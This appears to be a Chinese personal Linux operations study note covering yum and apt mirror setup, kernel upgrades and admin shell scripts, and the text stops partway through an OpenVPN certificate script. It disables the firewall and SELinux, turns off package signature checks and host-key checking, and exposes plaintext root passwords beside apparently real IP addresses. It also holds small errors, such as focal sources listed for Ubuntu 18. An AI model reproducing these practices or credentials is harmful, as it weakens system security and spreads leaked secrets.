[TOC]

## 前言

```
这一份linux笔记包含市面上绝大部分公司需要掌握主流的技术，它所含的技术栈囊括了初级运维到高级运维所必备的知识点，若想把市面上所有公司运用到的技术都囊括，我觉得我是做不到的，但我觉得这份笔记已经可以囊括各阶段运维所需要掌握的知识点了，笔者是java后端开发出身，但某一天对linux系统产生了浓厚的兴趣，于是就有了这份笔记，学linux无非就两个过程，第一阶段你要学会使用和搭建部署各种服务，总而言之一句话：先用起来再说！！！做人嘛肯定要功利点，我们只学公司用的频率多的，学了能给我们升职加薪的，不然学个毛线。。纯属浪费时间，第二个阶段：在我们已经可以熟练运用各种服务的时候，我们就要研究底层源码了，学会做内核的二次开发，只有深入理解内核源码，就不会被被人牵着鼻子走，不然别人稍微改点功能，我们又要自己再去学？？？一套源码在手，自己想怎么改就怎么改，自己想怎么开发就怎么开发，不过第二个阶段比较难。。笔者自己暂时也还在第一个阶段。。。

这份笔记会每天都会一直不断的更新，从搭建各类服务到linux内核源码分析，更新的进度是笔者学到哪里就更新到哪里，里面所有写的脚本笔者都在机器上跑过，是绝对没有问题的，但是由于Typora导出成pdf文件的时候，会出现一些格式转换的问题，如果读者直接从pdf文件里复制粘贴脚本肯定会出现一些问题，这些问题百分之99是换行空格的问题，不必惊慌，直接下载Typora文件复制粘贴即可。


注意：linux_note.pdf因文件格式较大，网站的打开要稍微等待一段时间！！！！请耐心等待！！！！也可以直接用手机QQ浏览器进行下载！！


下载说明：
要想在Typora中看到图片，要下载linux_note.assets和linuxSRE.assets和linux_note.md这三个文件下载到同一文件夹下面.
下载linux_note.assets的时候记得把linux_note.assets改成linux体系.assets



网站下载地址：http://liusenbiao.cn/download/
github地址：https://github.com/paranoid1997/computer_note
邮箱联系方式：1805336068@qq.com
```

## 0.linuxSRE架构图

**最终架构图：**

![1650003971595](linuxSRE.assets/1650003971595.png)

**小型架构图：**

![1654866417479](linuxSRE.assets/1654866417479.png)

## 1.搭建私有Yum仓库

### 1.1CentOS_7初始化

```
#关闭防火墙
[11:23:50 root@hostname ~]#systemctl disable --now firewalld
#关闭SElinux
[11:23:50 root@hostname ~]#vim /etc/selinux/config
SELINUX=disabled #这个设置完成后需要重启
#不重启方法
[11:23:50 root@hostname ~]#setenforce 0  #表示光报警不强制执行
```

![1649995255194](linuxSRE.assets/1649995255194.png)

### 1.2开始搭建Yum私有仓库

```
[11:23:50 root@hostname ~]#yum -y install httpd
[11:23:50 root@hostname ~]#systemctl enable --now httpd
[11:23:50 root@hostname ~]#cd /var/www/html
[11:23:50 root@hostname ~]#mkdir centos/{7,8} -pv
[11:23:50 root@hostname ~]#mount /dev/sr0 /var/www/html/centos/8
[11:23:50 root@hostname ~]#ls /var/www/html/centos/8
```

![1649998466723](linuxSRE.assets/1649998466723.png)

### 1.3修改本地仓库

```
[11:23:50 root@hostname ~]#vim /etc/yum.repos.d/base.repo
#修改baseurl
baseurl=http://10.0.0.7/centos/8/
```

![1649998822043](linuxSRE.assets/1649998822043.png)

## 2.搭建本地第三方源epel

### 2.1挂载本地光盘

CentOS

```
[11:23:50 root@hostname ~]#rpm -q autofs || yum -y install autofs
[11:23:50 root@hostname ~]#systemctl enable --now autofs
```

Ubuntu

```
[11:04:49 liu@ubuntu1804 ~]$sudo apt install autofs -y 
[11:04:49 liu@ubuntu1804 ~]$vim /etc/auto.master
[11:04:49 liu@ubuntu1804 ~]$systemctl restart autofs
```

![1649993808405](linuxSRE.assets/1649993808405.png)

### 2.2手动配置epel源（centos）

**Centos6:**

```
[08:46:07 root@centos6 ~]# mkdir /etc/yum.repos.d/backup
[08:46:07 root@centos6~]# mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup
[08:46:07 root@centos6 ~]# vim /etc/yum.repos.d/base.repo
[base]
name=base
baseurl=https://mirrors.cloud.tencent.com/centos/\$releasever/os/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/os/\$basearch/
        https://mirrors.aliyun.com/centos-vault/\$releasever.10/os/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/\$releasever.10/os/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever

[epel]
name=epel
baseurl=https://mirrors.cloud.tencent.com/epel/\$releasever/\$basearch/
        https://archives.fedoraproject.org/pub/archive/epel/\$releasever/\$basearch/
gpgcheck=1
gpgkey=https://mirrors.cloud.tencent.com/epel/RPM-GPG-KEY-EPEL-\$releasever

[extras]
name=extras
baseurl=https://mirrors.cloud.tencent.com/centos/\$releasever/os/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/extras/\$basearch/
        https://mirrors.aliyun.com/centos-vault/\$releasever.10/extras/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/\$releasever.10/extras/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever

[updates]
name=updates
baseurl=https://mirrors.cloud.tencent.com/centos/\$releasever/os/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/updates/\$basearch/
        https://mirrors.aliyun.com/centos-vault/\$releasever.10/updates/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/\$releasever.10/updates/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever

[centosplus]
name=centosplus
baseurl=https://mirrors.cloud.tencent.com/centos/\$releasever/os/\$basearch/
        http://mirrors.sohu.com/centos/\$releasever/centosplus/\$basearch/
        https://mirrors.aliyun.com/centos-vault/\$releasever.10/centosplus/\$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/\$releasever.10/centosplus/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-\$releasever
[08:46:07 root@centos6 ~]# yum clean all
[08:46:07 root@centos6 ~]# yum repolist
```

**Centos7:**

```
#这个是centos7配置epel源
[08:46:07 root@centos7 ~]# mkdir /etc/yum.repos.d/backup
[08:46:07 root@centos7 ~]# mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup 
[11:32:41 root@hostname ~]#cd /etc/yum.repos.d/
#一共建两个目录bak备用仓库把原来的源全部放在这个目录下，还有一个base.repo目录，用来放置手动修改的epel源
[11:46:39 root@hostname yum.repos.d]#vim base.repo
[base]
name=CentOS
baseurl=file:///misc/cd
          https://mirrors.aliyun.com/centos/$releasever/os/$basearch/
          https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/os/$basearch/
          https://mirrors.huaweicloud.com/centos/$releasever/os/x86_64/os/
          https://mirrors.cloud.tencent.com/centos/$releasever/os/$basearch/
gpgcheck=0

[extras]
name=extras
baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch
        https://mirrors.huaweicloud.com/centos/$releasever/extras/$basearch
        https://mirrors.cloud.tencent.com/centos/$releasever/extras/$basearch
          https://mirrors.aliyun.com/centos/$releasever/extras/$basearch
gpgcheck=0
enabled=1

[epel]
name=epel
baseurl=http://mirrors.cloud.tencent.com/epel/$releasever/$basearch
        http://mirrors.huaweicloud.com/epel/$releasever/$basearch
enabled=1
gpgcheck=1
gpgkey=http://mirrors.huaweicloud.com/epel/RPM-GPG-KEY-EPEL-7

[08:46:07 root@centos7 ~]# yum clean all
[08:46:07 root@centos7 ~]# yum repolist
```

**centos7官方仓库**

```
#方法一
# CentOS-Base.repo
#
# The mirror system uses the connecting IP address of the client and the
# update status of each mirror to pick mirrors that are updated to and
# geographically close to the client.  You should use this for CentOS updates
# unless you are manually picking other mirrors.
#
# If the mirrorlist= does not work for you, as a fall back you can try the 
# remarked out baseurl= line instead.
#
#
 
[base]
name=CentOS-$releasever - Base - mirrors.aliyun.com
failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/
        http://mirrors.aliyuncs.com/centos/$releasever/os/$basearch/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/os/$basearch/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7
 
#released updates 
[updates]
name=CentOS-$releasever - Updates - mirrors.aliyun.com
failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/
        http://mirrors.aliyuncs.com/centos/$releasever/updates/$basearch/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/updates/$basearch/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7
 
#additional packages that may be useful
[extras]
name=CentOS-$releasever - Extras - mirrors.aliyun.com
failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/
        http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7
 
#additional packages that extend functionality of existing packages
[centosplus]
name=CentOS-$releasever - Plus - mirrors.aliyun.com
failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/
        http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7
 
#contrib - packages by Centos Users
[contrib]
name=CentOS-$releasever - Contrib - mirrors.aliyun.com
failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/contrib/$basearch/
        http://mirrors.aliyuncs.com/centos/$releasever/contrib/$basearch/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/contrib/$basearch/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7

[epel]
name=Extra Packages for Enterprise Linux 7 - $basearch
baseurl=http://mirrors.aliyun.com/epel/7/$basearch
failovermethod=priority
enabled=1
gpgcheck=0
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7
 
[epel-debuginfo]
name=Extra Packages for Enterprise Linux 7 - $basearch - Debug
baseurl=http://mirrors.aliyun.com/epel/7/$basearch/debug
failovermethod=priority
enabled=0
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7
gpgcheck=0
 
[epel-source]
name=Extra Packages for Enterprise Linux 7 - $basearch - Source
baseurl=http://mirrors.aliyun.com/epel/7/SRPMS
failovermethod=priority
enabled=0
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7
gpgcheck=0





方法二
[root@e2dc8f46535b yum.repos.d]# wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/Centos-7.repo
[root@e2dc8f46535b yum.repos.d]# wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/epel-7.repo
```

**Centos8:**

```
#这个是centos8配置epel源
#方法一：挂到国内源上
[08:46:07 root@centos8 ~]# mkdir /etc/yum.repos.d/backup
[08:46:07 root@centos8 ~]# mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup 
[11:32:41 root@hostname ~]#cd /etc/yum.repos.d/
[11:46:39 root@hostname yum.repos.d]#vim base.repo
[BaseOS]
name=BaseOS
baseurl=https://mirrors.aliyun.com/centos/8/BaseOS/x86_64/os
        https://mirrors.cloud.tencent.com/centos/8/BaseOS/x86_64/os/
gpgcheck=0

[AppStream]
name=AppStream
baseurl=https://mirrors.aliyun.com/centos/8/AppStream/x86_64/os/
        http://mirrors.sohu.com/centos/8/AppStream/x86_64/os/
gpgcheck=0

[EPEL]
name=EPEL
baseurl=https://repo.huaweicloud.com/epel/8/Everything/x86_64/
        https://mirrors.aliyun.com/epel/8/Everything/x86_64/
        https://mirrors.cloud.tencent.com/epel/8/Everything/x86_64/
        https://mirrors.tuna.tsinghua.edu.cn/epel/8/Everything/x86_64/
gpgcheck=0
enabled=1

[extras]
name=extras
baseurl=https://mirrors.aliyun.com/centos/8/extras/x86_64/os/
        https://repo.huaweicloud.com/centos/8/extras/x86_64/os/
        https://mirrors.tuna.tsinghua.edu.cn/centos/8/extras/x86_64/os/
        http://mirrors.163.com/centos/8/extras/x86_64/os/
gpgcheck=0
enabled=1

[centosplus]
name=centosplus
baseurl=https://mirrors.aliyun.com/centos/8/centosplus/x86_64/os/
        https://mirrors.cloud.tencent.com/centos/8/centosplus/x86_64/os/
        http://mirrors.sohu.com/centos/8/centosplus/x86_64/os/
gpgcheck=0
enabled=0


[PowerTools]
name=PowerTools
baseurl=https://mirrors.aliyun.com/centos/8/PowerTools/x86_64/os/
        https://mirrors.huaweicloud.com/centos/8/PowerTools/x86_64/os/
        https://mirrors.cloud.tencent.com/centos/8/PowerTools/x86_64/os/
        https://mirrors.tuna.tsinghua.edu.cn/centos/8/PowerTools/x86_64/os/
        http://mirrors.163.com/centos/8/PowerTools/x86_64/os/
        http://mirrors.sohu.com/centos/8/PowerTools/x86_64/os/
gpgcheck=0
enabled=0
[08:46:07 root@centos8 ~]# yum clean all
[08:46:07 root@centos8 ~]# yum repolist




#方法二：放在自己搭建的yum仓库上
[BaseOS]
name=BaseOS
baseurl=http://10.0.0.7/centos/7/os/x86_64/BaseOS/
gpgcheck=0

[AppStream]
name=AppStream
baseurl=http://10.0.0.7/centos/7/os/x86_64/AppStream/
gpgcheck=0
```

**centos8官方仓库**

```
# CentOS-Base.repo
#
# The mirror system uses the connecting IP address of the client and the
# update status of each mirror to pick mirrors that are updated to and
# geographically close to the client.  You should use this for CentOS updates
# unless you are manually picking other mirrors.
#
# If the mirrorlist= does not work for you, as a fall back you can try the 
# remarked out baseurl= line instead.
#
#
 
[base]
name=CentOS-$releasever - Base - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/BaseOS/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
 
#additional packages that may be useful
[extras]
name=CentOS-$releasever - Extras - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
 
#additional packages that extend functionality of existing packages
[centosplus]
name=CentOS-$releasever - Plus - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
 
[PowerTools]
name=CentOS-$releasever - PowerTools - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/PowerTools/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official


[AppStream]
name=CentOS-$releasever - AppStream - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/AppStream/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
```

### 2.3 手动配置epel源（ubuntu）

**ubuntu_18.xx**

```
#ubuntu_18.xx
[09:57:12 liu@ubuntu1804 ~]$sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak
[09:59:05 liu@ubuntu1804 ~]$sudo vim /etc/apt/sources.list
deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse

deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable
```

**ubuntu_20.xx**

```
#ubuntu_20.xx
[09:57:12 liu@ubuntu1804 ~]$sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak
[09:59:05 liu@ubuntu1804 ~]$sudo vim /etc/apt/sources.list
deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
[10:00:11 liu@ubuntu1804 ~]$sudo apt update
```

### 2.4 手动配置epel源（alpine）

```
#修改源替换成阿里源，将里面dl-cdn.alpinelinux.org的改成 mirrors.aliyun.com
vi /etc/apk/repositories
http://mirrors.aliyun.com/alpine/v3.12/main/
http://mirrors.aliyun.com/alpine/v3.12/community/

#更新源
apk update

#安装软件
apk add vim

#删除软件
apk del openssh openntp vim
```

### 2.5查看是否成功

```
[11:49:34 root@hostname yum.repos.d]#yum repolist
```

![1649994695789](linuxSRE.assets/1649994695789.png)

## 3.升级内核

### 3.1去elrepo网站下载

```
https://www.elrepo.org/
```

### 3.2linux上安装

```
[13:00:42 root@hostname ~]#yum -y install https://www.elrepo.org/elrepo-release-7.el7.elrepo.noarch.rpm    #这个只适用于centos7版本的，如果出现问题 --skip
#安装完成后在/etc/yum.repos.d的路径下生成了一个配置文件
```

![1649999521161](linuxSRE.assets/1649999521161.png)



### 3.3修改禁用配置并安装内核

```
[13:10:23 root@hostname yum.repos.d]#yum repolist all
[13:10:23 root@hostname yum.repos.d]#vim elrepo.repo
#在[elrepo-kernel]把enabled=1
[13:10:23 root@hostname yum.repos.d]#yum list *kernel*
#最后一步：安装最新内核
[13:10:23 root@hostname yum.repos.d]#yum -y install kernel-lt.x86_64
#重启后，uname -r查看最新内核版本
[13:10:23 root@hostname yum.repos.d]#reboot;uname-r;
```

![1649999913822](linuxSRE.assets/1649999913822.png)

## 4.脚本合集

### 4.1一键安装apache脚本

```
 ###################################################################
   # File Name: auto_httpd.sh
   # Author: liusenbiao
   # mail: 1805336068@qq.com
   # Created Time: Fri 15 Apr 2022 01:27:27 PM CST
   #=============================================================
   #!/bin/bash

CPUS=`lscpu | sed -nr '4 s/\S+:\s+(\S+)$/\1/p'`
VERSION=2.4.46
TAR_SUFFIX="tar.bz2"
DOWLOAD_DIR=/usr/src
DEST_DIR=/usr/local/src
INSTALL_DIR=/apps/httpd
RE_VAR=`lsb_release -i  | sed -nr '/^Distributor ID/s/(\S+\s+){2}(\S)/\2/p'`

# 判断版本
[[ "$RE_VAR" =~ "CentOS"  ]] || { echo -e "${YELLOW}warning:${DIST} 暂时没有安装...! ${END}" ; exit 1 ; } 

# 判断wget命令是否存在
rpm -q wget &>/dev/null || { echo -e "${YELLOW}warning: Install wget ${END}" ; yum -y install wget &>/dev/null ; } 

# 下载apache软件包
echo -e "${GREEN}Downloading httpd packages....${END}"
wget -P $DOWLOAD_DIR https://mirrors.bfsu.edu.cn/apache//httpd/httpd-${VERSION}.${TAR_SUFFIX} &>/dev/null

# 如果没有下载成功，则退出
[ "$?" -eq 0 ] || { echo -e "${RED} httpd-${VERSION}.${TAR_SUFFIX} 下载失败 ....!${END}" ; exit 2 ; }

# 创建程序用户、程序组
id apache &> /dev/null || { groupadd -g 80 -r apache ; useradd -u 80 -g 80  -s /sbin/nologin  -r apache ; }


# 安装依赖包
echo -e "${GREEN}Downloading programs depends on packages.${END}"
yum -y install  dos2unix bzip2 redhat-lsb-core apr-devel gcc gcc-c++ pcre-devel openssl-devel make redhat-rpm-config  net-tools apr-util-devel  &>/dev/null

# 解压软件包到指定目录 
tar xf ${DOWLOAD_DIR}/httpd-${VERSION}.${TAR_SUFFIX} -C ${DEST_DIR}
cd  ${DEST_DIR}/httpd-${VERSION}/

# 预配置 &&  编译 && 安装
./configure --prefix=${INSTALL_DIR} --sysconfdir=/etc/httpd  --enable-ssl
make -j ${CPUS}  && make install 

# 将程序启动脚本路径,追加至PATH环境变量,并使配置文件生效。
echo 'PATH='${INSTALL_DIR}/bin:'$PATH' >> /etc/profile.d/apache.sh
source /etc/profile.d/apache.sh

# 修改配置文件 用户和组
sed -ri '/^User/ s/(\S+\s+)\S+$/\1apache/' /etc/httpd/httpd.conf 
sed -ri '/^Group/ s/(\S+\s+)\S+$/\1apache/' /etc/httpd/httpd.conf 
sed -i '/^#ServerName/s/^#//'  /etc/httpd/httpd.conf

# 启动服务 
apachectl start &>/dev/null
sleep 3

# 定义服务端口号 和 pid 文件
PID_FILE="${INSTALL_DIR}/logs/httpd.pid"
PORT_LINE=`netstat -antptu | grep -o "\<80\>" |wc -l`

# 判断服务是否启动成功。
[ -e  ${PID_FILE}  -a "${PORT_LINE}"  -eq  "1" ] || { echo -e "${RED}error:Service startup failed${END}" ; exit 3 ; } 
echo -e "${GREEN}Service started successfully!!!${END}"

```

![1650000705904](linuxSRE.assets/1650000705904.png)

### 4.2批量创建账号

```
#这个脚本后面可以跟多个未知的用户名
 if [ $# -eq 0 ];then
       echo "Usage: `basename $0` user1 user2..."
      exit
  fi 
  while [ "$1" ];do
      if id $1 is &> /dev/null;then
           echo $1 is exist
        else
           useradd $1
           echo "$1 is created"
        fi
        shift
  done
  echo "All useres is create"

#方法一：机器上批量创建用户和并设置随机密码
for i in {1..10};do
    useradd user$i
    PASS=`cat /dev/urandom | tr -dc '[:alnum:]' |head -c12`
    echo $PASS | passwd --stdin user$i &> /dev/null 
    echo user$i:$PASS >> /data/user.log
    echo "user$i is created"
done
#方法二：机器上批量创建用户和并设置随机密码
for i in {1..10};do
    useradd user$i
    PASS=`openssl rand -base64 12` 
    echo $PASS | passwd --stdin user$i &> /dev/null 
    echo user$i:$PASS >> /data/user.log
    echo "user$i is created"
done

#各个机器上批量创建用户和并设置随机密码(调用expect)
NET=10.0.0
user=root
password=123456
IPLIST="
7
18
101
"
for ID in $IPLIST;do
ip=$NET.$ID
expect <<EOF
set timeout 20
spawn ssh $user@$ip
expect {
        "yes/no" { send "yes\n";exp_continue }
        "password" { send "$password\n" }
}
expect "#" { send "useradd test\n" }
expect "#" { send "exit\n" }
expect eof
EOF
done
```

### 4.3检查磁盘利用率

```
###################################################################
# File Name: disk_check2.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Fri 22 Apr 2022 11:08:03 AM CST
#=============================================================
#!/bin/bash
while true;do
df | sed -rn "/^\/dev\/sd/s#^([^ ]+).* ([0-9]+).*#\1 \2#p" | while read DEV USE;do
        [ $USE -gt 80 ] && echo "$DEV will be full,use:$USE" | mail -s "disk Warning" 1805336068@qq.com
        done
sleep 10
done
```

### 4.4一键搭建CA脚本

```
#1.这只是给一个用户颁发证书
#!/bin/bash
#
#********************************************************************
#Author:                liusenbiao
#QQ:                    1805336068      
#Date:                  2022-05-04
#FileName：             certificate.sh
#********************************************************************
CA_SUBJECT="/O=liusenbiao/CN=ca.liusenbiao.cn"
SUBJECT="/C=CN/ST=jiangsu/L=taizhou/O=magedu/CN=www.liusenbiao.cn"
SERIAL=34
EXPIRE=202002
FILE=liusenbiao.org

openssl req  -x509 -newkey rsa:2048 -subj $CA_SUBJECT -keyout ca.key -nodes -days 202002 -out ca.crt

openssl req -newkey rsa:2048 -nodes -keyout ${FILE}.key  -subj $SUBJECT -out ${FILE}.csr

openssl x509 -req -in ${FILE}.csr  -CA ca.crt -CAkey ca.key -set_serial $SERIAL  -days $EXPIRE -out ${FILE}.crt

chmod 600 ${FILE}.key ca.key

#2.这只是给多个用户颁发证书
#!/bin/bash
#
#********************************************************************
#Author:                liusenbiao
#QQ:                    1805336068      
#Date:                  2022-05-04
#FileName：             certificate.sh
#********************************************************************
#证书存放目录
DIR=/data

#每个证书信息
declare -A CERT_INFO
CERT_INFO=([subject0]="/O=heaven/CN=ca.god.com" \
           [keyfile0]="cakey.pem" \
           [crtfile0]="cacert.pem" \
           [key0]=2048 \
           [expire0]=3650 \
           [serial0]=0    \
           [subject1]="/C=CN/ST=hubei/L=wuhan/O=Central.Hospital/CN=master.liwenliang.org" \
           [keyfile1]="master.key" \
           [crtfile1]="master.crt" \
           [key1]=2048 \
           [expire1]=365
           [serial1]=1 \
           [csrfile1]="master.csr" \
           [subject2]="/C=CN/ST=hubei/L=wuhan/O=Central.Hospital/CN=slave.liwenliang.org" \
           [keyfile2]="slave.key" \
           [crtfile2]="slave.crt" \
           [key2]=2048 \
           [expire2]=365 \
           [serial2]=2 \
           [csrfile2]="slave.csr"   )

COLOR="echo -e \\E[1;32m"
END="\\E[0m"

#证书编号最大值
N=`echo ${!CERT_INFO[*]} |grep -o subject|wc -l`

cd $DIR 

for((i=0;i<N;i++));do
    if [ $i -eq 0 ] ;then
        openssl req  -x509 -newkey rsa:${CERT_INFO[key${i}]} -subj ${CERT_INFO[subject${i}]} \
            -set_serial ${CERT_INFO[serial${i}]} -keyout ${CERT_INFO[keyfile${i}]} -nodes \
	    -days ${CERT_INFO[expire${i}]}  -out ${CERT_INFO[crtfile${i}]} &>/dev/null
        
    else 
        openssl req -newkey rsa:${CERT_INFO[key${i}]} -nodes -subj ${CERT_INFO[subject${i}]} \
            -keyout ${CERT_INFO[keyfile${i}]}   -out ${CERT_INFO[csrfile${i}]} &>/dev/null

        openssl x509 -req -in ${CERT_INFO[csrfile${i}]}  -CA ${CERT_INFO[crtfile0]} \
	    -CAkey ${CERT_INFO[keyfile0]}  -set_serial ${CERT_INFO[serial${i}]}  \
	    -days ${CERT_INFO[expire${i}]} -out ${CERT_INFO[crtfile${i}]} &>/dev/null
    fi
    $COLOR"**************************************生成证书信息**************************************"$END
    openssl x509 -in ${CERT_INFO[crtfile${i}]} -noout -subject -dates -serial
    echo 
done
chmod 600 *.key
echo  "证书生成完成"
$COLOR"**************************************生成证书文件如下**************************************"$END
echo "证书存放目录: "$DIR
echo "证书文件列表: "`ls $DIR`
```

### 4.5批量部署多台主机基于key验证脚本

```
#首先要各个主机密码都改成一样的
[root@liuailiyun ~]# echo Xjy19970520 | passwd --stdin root
#!/bin/bash
#
#********************************************************************
#Author:                liusenbiao
#QQ:                    1805336068      
#Date:                  2022-05-04
#FileName：             certificate.sh
#********************************************************************
HOSTS="
39.103.190.214
10.0.0.153
39.99.227.252
"
PASS=Xjy19970520
[ -f /root/.ssh/id_rsa ] || ssh-keygen -f ~/.ssh/id_rsa -q -N '' &> /dev/null
yum -y install sshpass &> /dev/null
for i in $HOSTS;do
        {   
        sshpass -p $PASS ssh-copy-id -i ~/.ssh/id_rsa.pub -o StrictHostKeyChecking=no $i &> /dev/null
          }&  
done
wait
```

### 4.6客户端证书自动颁发脚本

```
# 自动化的证书颁发脚本
#!/bin/bash
#
#********************************************************************
#Author: liusenbiao
#QQ: 1805336068
#Date: 2022-5-19
#FileName： openvpn-user-crt.sh
#URL: http://www.liusenbiao.com
#Description： The test script
#Copyright (C): 2020 All rights reserved
#********************************************************************
. /etc/init.d/functions

OPENVPN_SERVER=8.142.75.195
PASS=123456

remove_cert() {
    touch heman.txt
    rm -rf /etc/openvpn/client/${NAME}
    find /etc/openvpn/ -name "$NAME.*" -delete
}

create_cert() {
    cd /etc/openvpn/easy-rsa-client/3
   ./easyrsa gen-req ${NAME} nopass <<EOF

EOF
    cd /etc/oprnvpn/easy-rsa-server/3
   ./easyrsa import-req /etc/openvpn/easy-rsa-client/3/pki/reqs/${NAME}.req ${NAME}
   ./easyrsa sign client ${NAME} <<EOF
yes
EOF
    mkdir /etc/openvpn/client/${NAME}
    cp /etc/openvpn/easy-rsa-server/3/pki/issued/${NAME}.crt /etc/openvpn/client/${NAME}
    cp /etc/openvpn/easy-rsa-client/3/pki/private/${NAME}.key /etc/openvpn/client/${NAME}
    cp /etc/openvpn/certs/{ca.crt,dh.pem,ta.key} /etc/openvpn/client/${NAME}
    cat > /etc/openvpn/client/${NAME}/client.ovpn <<EOF
client
dev tun
proto tcp
remote ${OPENVPN_SERVER} 1194
resolv-retry infinite
nobind
#persist-key
#persist-tun
ca ca.crt
cert $NAME.crt
key $NAME.key
remote-cert-tls server
